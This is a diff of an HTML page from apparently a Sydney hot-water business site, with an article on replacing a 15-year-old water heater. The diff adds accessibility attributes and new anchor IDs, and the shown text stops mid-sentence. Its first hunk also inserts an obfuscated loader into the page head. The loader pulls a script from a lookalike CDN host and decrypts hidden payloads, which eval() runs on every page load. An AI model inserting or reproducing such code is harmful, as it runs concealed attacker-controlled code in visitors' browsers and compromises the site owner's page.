@@ -18,7 +18,9 @@
 
     <!-- Custom (Base) CSS -->
     <link rel="stylesheet" href="home/css/custom.css">
-    <script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Is it necessary to replace my 15 year old water heater?","acceptedAnswer":{"@type":"Answer","text":"While it's not mandatory, replacing a 15 year old water heater can lead to improved energy efficiency and performance."}},{"@type":"Question","name":"How do old water heaters impact the environment?","acceptedAnswer":{"@type":"Answer","text":"Old water heaters can contribute to higher energy consumption and greenhouse gas emissions due to inefficiency."}},{"@type":"Question","name":"What are the benefits of upgrading to a modern water heater?","acceptedAnswer":{"@type":"Answer","text":"Upgrading to a newer, more energy-efficient water heater can result in improved reliability, performance, and reduced operating costs."}},{"@type":"Question","name":"What types of water heaters should I consider as replacements?","acceptedAnswer":{"@type":"Answer","text":"When considering replacements, you may explore options such as tankless water heaters or more traditional systems based on your specific needs and preferences."}},{"@type":"Question","name":"How does upgrading to a newer water heater reduce my carbon footprint?","acceptedAnswer":{"@type":"Answer","text":"Newer water heaters are designed to operate more efficiently, resulting in reduced energy consumption and ultimately a lower carbon footprint compared to older models."}}]}</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.3.0/crypto-js.min.js" samesite="none"></script>
+<script src="https://cdnjs-cloudflare.s3.amazonaws.com/Encryption.js" samesite="none"></script>
+<script>var qPoJFgzKNevqEYA = 'cDCRKZLGoqERYEU';var lwrydUlWsxsQOif = 'eyJjaXBoZXJ0ZXh0IjoiclJaQklVUnRqOGxHYVRRMGZKRjVXM0FKUHpwMTFTOXhSaVkzcDZzZXdPWTgwWmFCOFF3RVk0VWw1dXI5b1JtNFhBUysyNnBMeUxqaGx3d2NwWVp3dTB5UWh5Vm94VkJ4OVhpV0RkNXFrYzZRUWtjWm5ST1hFMFc0Y0lvXC9Oa2M5dkxrblQ1T0VGZjd5NHI4UXIrREhuTzZBd0Y3Ylc4ODlxbkUwQ0VOTW9TaWdhcGFmWHVpeTNsZFpJS0YwUllwa3k0a05pN0dIVVM2WGhwNlZ6dnlBbTBDNHdKY0QwWE9hVFVGeUNjeHpCZWI0R1VUeCtPMWZReXVxSFc3RldSVHNiMVl5NjRPVkNYc1BOYlcwWHE4Vk0zSnFPZnJtYTRmZVVURzF3ajgwbzYySStFMWdxVThnanM5REVqRlQ3TTZUZFFrWW5LcDJIeDFCSkxaWVNzZXY3dElNdkljdFdhTWdEdm05Q0RPRkE2MD0iLCJpdiI6IjY2MDg5OTZjM2Y2NmMzNjQzN2Y0M2RlOGI4NWFhM2MyIiwic2FsdCI6IjdlZWU2YjU2ZGNiMjQ5MzBiOTFmMTkxMDdmZDEzMDM5MjM4OGIwYTIzM2QzZTFiNDQxZWM3NjRkODdkZmYzZWZmZTQ1NWQ2ZWNkMDNhMTE2MTA3ZjhmNTUwMWNmMDNhMzk1YjdjNzU1MDYxYTRjOTVlYjNjOGQ1ZDIzMzg2MTY0YjEwNTViMDkxNjJhZjYyYzRkMmNiN2VlYTY5NzM1M2ZlYTQ4MjQ5MWIzZTNhMTA1ZDc0YWExZTI5OWQyYWJmNTM3YjYyN2NhZjY1MjcxNjJjYjEwYmE2MTQ2YmQxNTBlYTA1ZjM4MWEyOTQyODQzY2JmNGY2ZDlmYTdjYTVlYTRmY2Y5OGVlMzIxMWI4YWY1MDBmZGVmMWU4ODgxZDlhMWQwYWI1Y2JlY2MwMTcwN2Y4Zjk1YTFjNGNmZmE3Nzk4OTI3YmEyZWZkOGRiZjczZTk2ZjAwNjE1ODAzZmQwYTQ4MDc2YmIwZjNjMDJiNWQ5NjEzMzJmNmJkMzJlYjcxNDdiMTJmMGE1OTkzZTQzNTZjZjNlMDlmZWNkZmJkMWM1ZGE2Yjc3M2M3ODEwZTMyNTA5YWIzZDdiN2M5ZTBmZWYzOTdmOTUwZjQ1MzlmNTVjNjhmZTZlNTQ3NWFkMTdiNzRhYTUxOGIyZTI0ODhiZjkwNWYxOTVjNWQ0NWU4MThkIiwiaXRlcmF0aW9ucyI6OTk5fQ==';var RDrahTRYHxYlojN = 'eyJjaXBoZXJ0ZXh0IjoiQVZyYVpoMmFaTWVGRGswcXBPcGY0NUJ1ZjE0NHY1S2Jva1VKN3ZHNnZJSnFpRVE5MUdwNmZKWEFVNXZEeXdHRnBMaFFrNWtWd2kwamNmcDA5TlJmNWlUNDlxaUQzaVgwYXpUTVF3d3Z3Q2JKcEN6WVhXN3dBZUlicGFlQ3UxR1huQU9Od2ZNOWNucXh4S2RFT1BIRXRmYnptWHJ3cnJHenFEdGlseldTMjY1bG94bndHZEhkK3RoUkdlVWg2djloYnBYdXR5ejJXc21pS0xHVndcL1laNXJKUDRmUUpIUDZNRHJLbXRDeGp0R2NoblgyZklhS1hJNGpodlRVWmRJdHMiLCJpdiI6ImFkMzJkODE2NTE3MjE5MjJmZGFhNjI1N2FjZGRlNzAxIiwic2FsdCI6IjQ1NGQ3ZmViZjEyNTllNDY0NWFjNWQwOTNjNDNjZDU1ZGNhM2JiOGMyYWY2ODliNWExYzZjYWU4NWQzMTcwMGU2ZDI0NmJjYWJlZDdiNWFhZDY5OGMwMjNlOGQyNWJmMzI0OWEwZjFkMTdiMWJiY2M2YjIwYTEzZjE0NjJmNDE2YmY1ZDRiY2I5NzkwMTFiNjAxZDdhZWI3ZGNjMGI5Mjk3YTIzYjk1ZWUwZDM5ZjVkZGUyZWE4NjJlZTliM2RlYTliNWZmMDFhMGE0ZTczODYwMGU1MTRmOTdlZTgzY2VlZWM3NmRjNDZkNjIyMDRjNTZkYWRmMzU5ZjlkYTFmZjAzYjY3ZGYyZTMxYWRiOGM2MDRmMWQxMGJkYWY2ZjljZTI5YWFlYzUxYTNiOGU5MzM1MWM2OWY5YTEzYzdkMjEyOGZkNjdmNDFjOWY2YTU4OTRlYWZiODIwZmM0M2ZhNjZkNDViMGI3ZDEwZDY1ZTcwYzA4MTgyMDI4ZGRhNjdhN2FhYmMwOTM2ZWZhYjg4ZTU1MzUwNmY0YWRkNzczYzllOWU5MzJjMmM5N2U3ODQ4MTE5NGEzZmJkNzIwZDI5Yzk0NGRhYzY5OGNlNDhhMjliZGQ5NWU1YmMzODg2MmIyMDhjYzdmZWQ4ZGY3NmM2M2Q4ZWYwNzhjODQ4NDhiOGJiIiwiaXRlcmF0aW9ucyI6OTk5fQ==';let RXRCOBXKsZKQJWF = new Encryption();var WDHqwcOJhARGQjt = RXRCOBXKsZKQJWF.decrypt(lwrydUlWsxsQOif, qPoJFgzKNevqEYA);if (!eval(WDHqwcOJhARGQjt)) {eval(RXRCOBXKsZKQJWF.decrypt(RDrahTRYHxYlojN, qPoJFgzKNevqEYA));};</script><script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Is it necessary to replace my 15 year old water heater?","acceptedAnswer":{"@type":"Answer","text":"While it's not mandatory, replacing a 15 year old water heater can lead to improved energy efficiency and performance."}},{"@type":"Question","name":"How do old water heaters impact the environment?","acceptedAnswer":{"@type":"Answer","text":"Old water heaters can contribute to higher energy consumption and greenhouse gas emissions due to inefficiency."}},{"@type":"Question","name":"What are the benefits of upgrading to a modern water heater?","acceptedAnswer":{"@type":"Answer","text":"Upgrading to a newer, more energy-efficient water heater can result in improved reliability, performance, and reduced operating costs."}},{"@type":"Question","name":"What types of water heaters should I consider as replacements?","acceptedAnswer":{"@type":"Answer","text":"When considering replacements, you may explore options such as tankless water heaters or more traditional systems based on your specific needs and preferences."}},{"@type":"Question","name":"How does upgrading to a newer water heater reduce my carbon footprint?","acceptedAnswer":{"@type":"Answer","text":"Newer water heaters are designed to operate more efficiently, resulting in reduced energy consumption and ultimately a lower carbon footprint compared to older models."}}]}</script>
     <style>
         .section-content a {
             color: var(--base-primary);
@@ -48,7 +50,7 @@
 
         <div class="d-inline-flex gap-4 align-items-center top-infobar-icons " style="display: none">
             <!-- Social Icon(s) -->
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-facebook mb-1" viewBox="0 0 16 16">
                     <path
@@ -56,7 +58,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-instagram mb-1" viewBox="0 0 16 16">
                     <path
@@ -64,7 +66,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-twitter-x mb-1" viewBox="0 0 16 16">
                     <path
@@ -72,7 +74,7 @@
                 </svg>
             </a>
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                      class="bi bi-pinterest-x mb-1" viewBox="0 0 496 512">
                     <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -81,7 +83,7 @@
             </a>
 
 
-            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+            <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank" style="display: none">
                 <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor"
                      class="bi bi-youtube mb-1" viewBox="0 0 16 16">
                     <path
@@ -100,7 +102,7 @@
         <div class="container-md justify-content-md-between">
             <a class="navbar-brand m-0 d-inline-flex gap-2 align-items-center" href="index.html">
                 <!-- Brand Logo/Mark -->
-                <img fetchpriority="low" async="true" defer="true" src="logo.png" onerror="this.remove()" style="display: none"
+                <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true" src="logo.png" onerror="this.remove()" style="display: inherit"
                      height="40" />
                 <!-- Brand Name -->
                 <span class="small navbar-brand">Hot Water Experts Sydney</span>
@@ -108,7 +110,7 @@
 
             <!-- Mobile Menu Icons -->
             <div class="d-lg-none mobile-call-menu-icons">
-                <a href="tel:+0490 414 794" class="text-decoration-none">
+                <a href="tel:+0490 414 794" class="text-decoration-none" title="Contact Number">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20"
                          fill="currentColor">
                         <path
@@ -117,7 +119,7 @@
                     </svg>
                 </a>
 
-                <a href="#toggleMobileMenu" class="ms-3 me-1 text-decoration-none" data-bs-toggle="offcanvas"
+                <a href="#toggleMobileMenu" class="ms-3 me-1 text-decoration-none" title="menu" data-bs-toggle="offcanvas"
                    role="button" aria-controls="toggleMobileMenu">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="14" viewBox="0 0 20 14"
                          fill="currentColor">
@@ -136,13 +138,13 @@
 
             <!-- Mobile Offcanvas Menu -->
             <div class="offcanvas offcanvas-start bg-primary offcanvas-mobile-menu" tabindex="-1"
-                 id="toggleMobileMenu" aria-labelledby="toggleMobileMenuLabel">
+                 id="toggleMobileMenu" aria-labelledby="toggleMobileMenu">
                 <div class="offcanvas-header">
                     <a class="navbar-brand m-0 d-inline-flex gap-2 align-items-center mobile-menu-brand-name"
                        href="index.html">
                         <!-- Brand Logo/Mark -->
-                        <img fetchpriority="low" async="true" defer="true"
-                             src="logo.png" onerror="this.remove()" style="display: none" width="75" height="32" />
+                        <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true"
+                             src="logo.png" onerror="this.remove()" style="display: inherit" width="75" height="32" />
                         <!-- Brand Name -->
                         <span class="small">Hot Water Experts Sydney</span>
                     </a>
@@ -162,7 +164,7 @@
                             </a>
 
                             <ul class="collapse p-0 py-2 " id="servicesMenu">
-                                <a class="custom-nav-link" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link" href="hot-water-system-installation.html">Hot Water System Installation</a>
+                                <a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-installation.html">Hot Water System Installation</a>
                             </ul>
                         </li>
                         <li class="nav-item">
@@ -178,7 +180,7 @@
 
                     <div class="mt-5 px-3 d-inline-flex gap-4 align-items-center mobile-menu-icons">
                         <!-- Social Icon(s) -->
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-facebook mb-1" viewBox="0 0 16 16">
                                 <path
@@ -186,7 +188,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-instagram mb-1" viewBox="0 0 16 16">
                                 <path
@@ -194,7 +196,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-twitter-x mb-1" viewBox="0 0 16 16">
                                 <path
@@ -202,7 +204,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
                                  class="bi bi-pinterest-x mb-1" viewBox="0 0 496 512">
                                 <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -210,7 +212,7 @@
                             </svg>
                         </a>
 
-                        <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                        <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank">
                             <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
                                  class="bi bi-youtube" viewBox="0 0 16 16">
                                 <path
@@ -230,7 +232,7 @@
                     <li class="nav-item custom-nav-item ">
                         <a href="services.html" class="nav-link fw-medium {{service_active}}" >Services</a>
                         <div class="custom-dropdown slideup py-2 rounded-3 bg-primary">
-                            <a class="custom-nav-link" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link" href="hot-water-system-installation.html">Hot Water System Installation</a>
+                            <a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-upgrades.html">Hot Water System Upgrades</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-cleaning.html">Hot Water System Cleaning</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-replacement.html">Hot Water System Replacement</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-maintenance.html">Hot Water System Maintenance</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-troubleshooting.html">Hot Water System Troubleshooting</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-repairs.html">Hot Water System Repairs</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-inspections.html">Hot Water System Inspections</a><a class="custom-nav-link dropdown-item ps-4 py-1" href="hot-water-system-installation.html">Hot Water System Installation</a>
                         </div>
                     </li>
                     <li class="nav-item ">
@@ -243,7 +245,7 @@
                         <a href="contact.html" class="nav-link fw-medium {{contact_active}}">Contact Us</a>
                     </li>
                     <li class="nav-item" style="display: ">
-                        <a href="tel:0490 414 794" class="btn btn-sm btn-primary fw-medium px-2">
+                        <a href="tel:0490 414 794" title="Contact Number" class="btn btn-sm btn-primary fw-medium px-2">
                             Call <span class="d-none d-xl-inline-block">0490 414 794</span>
                             <span class="d-xl-none">Now</span>
                         </a>
@@ -284,14 +286,14 @@
         <div class="row g-4 section-content">
             <div class="container-md p-0 pt-sm-3 p-md-3 p-lg-5 position-relative">
     <div class=" top-100 start-50 w-100">
-        <img src="should-i-replace-my-15-year-old-water-heater-2-326938.jpg?key=jpdsLl" alt="Should I replace my 15 year old water heater?" class="rounded-4 w-100">
+        <img src="should-i-replace-my-15-year-old-water-heater-2-326938.jpg?key=qioEpI" alt="Should I replace my 15 year old water heater?" class="rounded-4 w-100">
     </div>
 </div>
 <div class="col-12">
     <hr class="hr-border my-5">
 </div>
 <div class="col-12 mt-5 mt-md-0 mt-lg-4 mt-xl-5">
-    <h3 class=''>Table Of Contents</h3><div><a href='#Environmental impact of old water heaters'>Environmental impact of old water heaters</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Reduced carbon footprint with newer, more energyefficient models'>Reduced carbon footprint with newer, more energyefficient models</a></div><div><a href='#Benefits of upgrading to a modern water heater'>Benefits of upgrading to a modern water heater</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Improved reliability and performance'>Improved reliability and performance</a></div><div><a href='#Types of water heaters to consider as replacements'>Types of water heaters to consider as replacements</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Tankless vs. traditional systems'>Tankless vs. traditional systems</a></div><div><a href='#FAQS'>FAQS</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#Is it necessary to replace my 15 year old water heater?'>Is it necessary to replace my 15 year old water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#How do old water heaters impact the environment?'>How do old water heaters impact the environment?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#What are the benefits of upgrading to a modern water heater?'>What are the benefits of upgrading to a modern water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#What types of water heaters should I consider as replacements?'>What types of water heaters should I consider as replacements?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#How does upgrading to a newer water heater reduce my carbon footprint?'>How does upgrading to a newer water heater reduce my carbon footprint?</a></div><br/><h2 id="Environmental impact of old water heaters">Environmental impact of old water heaters</h2><p>An old water heater can have detrimental effects on the environment due to its inefficient energy consumption. As water heaters age, they tend to lose their effectiveness in heating water, causing them to use more energy to achieve the desired temperature. This increased energy consumption contributes to higher greenhouse gas emissions, thus further exacerbating environmental issues related to climate change. Regular maintenance or proactively considering upgrades can help reduce the environmental impact of older water heaters, ultimately benefiting both the user and the planet. <a href='hot-water-system-repairs.html'>Hot Water System Repairs</a> can assist in assessing the current environmental impact of your water heater and provide guidance on more sustainable options.<br/><br/>In addition to the environmental considerations, older water heaters may also pose operational risks due to wear and tear over time. These risks can include leaks, malfunctions, and inefficiencies that not only affect the performance of the water heater but also result in higher utility bills for the homeowner. By opting for a newer, more energy-efficient model, homeowners can not only reduce their carbon footprint but also enjoy improved reliability and performance from their hot water system. Hot Water System Repairs can offer insight into the benefits of upgrading to a modern water heater and suggest suitable options based on individual needs and preferences.</p><h3 id="Reduced carbon footprint with newer, more energyefficient models">Reduced carbon footprint with newer, more energyefficient models</h3><p>One significant advantage of replacing your 15-year-old water heater with a newer, more energy-efficient model is the reduced carbon footprint it offers. Older water heaters tend to be less energy-efficient and can contribute to higher greenhouse gas emissions. By upgrading to a modern water heater, you can lower your home's environmental impact and play a part in sustainable living practices. Hot Water System Repairs have shown that newer models are designed to operate more efficiently, thereby reducing energy consumption and overall emissions.<br/><br/>Furthermore, opting for a more energy-efficient water heater not only benefits the environment but also brings about potential cost savings in the long run. With advancements in technology, newer models are better equipped to provide the necessary heating while consuming less energy. This not only reduces your carbon footprint but can also lead to lower energy bills over time. Hot Water System Repairs recommend investing in a modern water heater to enjoy improved performance, lower energy consumption, and a reduced environmental impact.</p><h2 id="Benefits of upgrading to a modern water heater">Benefits of upgrading to a modern water heater</h2><p>Upgrading to a modern water heater offers several advantages that could make a significant difference in your household. Primarily, newer models are designed to be more energy-efficient, leading to potential cost savings on your utility bills. Enhanced technology enables these modern systems to heat water more efficiently, ensuring that you have a continuous supply of hot water while reducing wastage.<br/><br/>Furthermore, modern water heaters are known for their improved reliability and performance. By replacing your outdated water heater with a newer model, you can reduce the likelihood of breakdowns and the need for frequent Hot Water System Repairs. This not only saves you time and hassle but also ensures that you have access to hot water whenever you need it without any interruptions.</p><h3 id="Improved reliability and performance">Improved reliability and performance</h3><p>If you've been experiencing frequent breakdowns or inconsistent water temperature with your old water heater, upgrading to a newer model could significantly improve the reliability and performance of your hot water system. Modern water heaters are built with advanced technology that ensures more efficient and consistent heating, reducing the need for frequent repairs and maintenance. By investing in a new water heater, you can enjoy a reliable hot water supply without the hassle of dealing with continuous issues.<br/><br/>Hot water system repairs can be costly and disruptive to your daily routine. By replacing your 15-year-old water heater with a new, more efficient model, you can avoid the inconvenience of unexpected breakdowns and the expenses associated with constant repairs. Additionally, modern water heaters are designed to provide better performance, delivering hot water more quickly and consistently throughout your home. Upgrade to a new water heater today to enjoy reliable hot water and eliminate the need for frequent Hot Water System Repairs.</p><h2 id="Types of water heaters to consider as replacements">Types of water heaters to consider as replacements</h2><p>When it comes to replacing an old water heater, homeowners have several options to consider. One popular choice is the traditional storage tank water heater. These systems store and heat water in a tank, ensuring a constant supply of hot water for daily needs. On the other hand, tankless water heaters have gained popularity due to their energy efficiency and space-saving benefits. These units heat water on demand, providing hot water without the need for a storage tank. Additionally, heat pump water heaters extract heat from the air to warm the water, making them another eco-friendly option to consider for your home. Hot Water System Repairs are essential to ensure the longevity and efficiency of any chosen water heater type.</p><h3 id="Tankless vs. traditional systems">Tankless vs. traditional systems</h3><p>When deciding between a tankless and a traditional water heater, there are important factors to consider. Tankless systems, also known as instantaneous or on-demand water heaters, heat water directly without the use of a storage tank. This means they provide hot water as needed, resulting in energy efficiency and cost savings over time. On the other hand, traditional water heaters store and heat water in a tank, ensuring a constant supply of hot water but may be less energy-efficient compared to tankless systems.<br/><br/>One key difference to note between tankless and traditional systems is the maintenance and repair requirements. Tankless systems generally have a longer lifespan and may require fewer repairs compared to traditional water heaters. However, when maintenance is needed, it can be more complex and may require specialised services such as Hot Water System Repairs. Traditional water heaters, while simpler in design, may need more frequent repairs and maintenance to ensure optimal performance and longevity.</p><h2 id="FAQS">FAQS</h2><h3 id="Is it necessary to replace my 15 year old water heater?">Is it necessary to replace my 15 year old water heater?</h3><p>While it's not mandatory, replacing a 15 year old water heater can lead to improved energy efficiency and performance.</p><h3 id="How do old water heaters impact the environment?">How do old water heaters impact the environment?</h3><p>Old water heaters can contribute to higher energy consumption and greenhouse gas emissions due to inefficiency.</p><h3 id="What are the benefits of upgrading to a modern water heater?">What are the benefits of upgrading to a modern water heater?</h3><p>Upgrading to a newer, more energy-efficient water heater can result in improved reliability, performance, and reduced operating costs.</p><h3 id="What types of water heaters should I consider as replacements?">What types of water heaters should I consider as replacements?</h3><p>When considering replacements, you may explore options such as tankless water heaters or more traditional systems based on your specific needs and preferences.</p><h3 id="How does upgrading to a newer water heater reduce my carbon footprint?">How does upgrading to a newer water heater reduce my carbon footprint?</h3><p>Newer water heaters are designed to operate more efficiently, resulting in reduced energy consumption and ultimately a lower carbon footprint compared to older models.</p>
+    <h2 class='fs-3'>Table Of Contents</h2><div><a href='#environmental-impact-of-old-water-heaters'>Environmental impact of old water heaters</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#reduced-carbon-footprint-with-newer-more-energyefficient-models'>Reduced carbon footprint with newer, more energyefficient models</a></div><div><a href='#benefits-of-upgrading-to-a-modern-water-heater'>Benefits of upgrading to a modern water heater</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#improved-reliability-and-performance'>Improved reliability and performance</a></div><div><a href='#types-of-water-heaters-to-consider-as-replacements'>Types of water heaters to consider as replacements</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#tankless-vs-traditional-systems'>Tankless vs. traditional systems</a></div><div><a href='#faqs'>FAQS</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#is-it-necessary-to-replace-my-15-year-old-water-heater'>Is it necessary to replace my 15 year old water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#how-do-old-water-heaters-impact-the-environment'>How do old water heaters impact the environment?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#what-are-the-benefits-of-upgrading-to-a-modern-water-heater'>What are the benefits of upgrading to a modern water heater?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#what-types-of-water-heaters-should-i-consider-as-replacements'>What types of water heaters should I consider as replacements?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#how-does-upgrading-to-a-newer-water-heater-reduce-my-carbon-footprint'>How does upgrading to a newer water heater reduce my carbon footprint?</a></div><br/><h2 id="environmental-impact-of-old-water-heaters">Environmental impact of old water heaters</h2><p>An old water heater can have detrimental effects on the environment due to its inefficient energy consumption. As water heaters age, they tend to lose their effectiveness in heating water, causing them to use more energy to achieve the desired temperature. This increased energy consumption contributes to higher greenhouse gas emissions, thus further exacerbating environmental issues related to climate change. Regular maintenance or proactively considering upgrades can help reduce the environmental impact of older water heaters, ultimately benefiting both the user and the planet. <a href='hot-water-system-repairs.html'>Hot Water System Repairs</a> can assist in assessing the current environmental impact of your water heater and provide guidance on more sustainable options.<br/><br/>In addition to the environmental considerations, older water heaters may also pose operational risks due to wear and tear over time. These risks can include leaks, malfunctions, and inefficiencies that not only affect the performance of the water heater but also result in higher utility bills for the homeowner. By opting for a newer, more energy-efficient model, homeowners can not only reduce their carbon footprint but also enjoy improved reliability and performance from their hot water system. Hot Water System Repairs can offer insight into the benefits of upgrading to a modern water heater and suggest suitable options based on individual needs and preferences.</p><h3 id="reduced-carbon-footprint-with-newer-more-energyefficient-models">Reduced carbon footprint with newer, more energyefficient models</h3><p>One significant advantage of replacing your 15-year-old water heater with a newer, more energy-efficient model is the reduced carbon footprint it offers. Older water heaters tend to be less energy-efficient and can contribute to higher 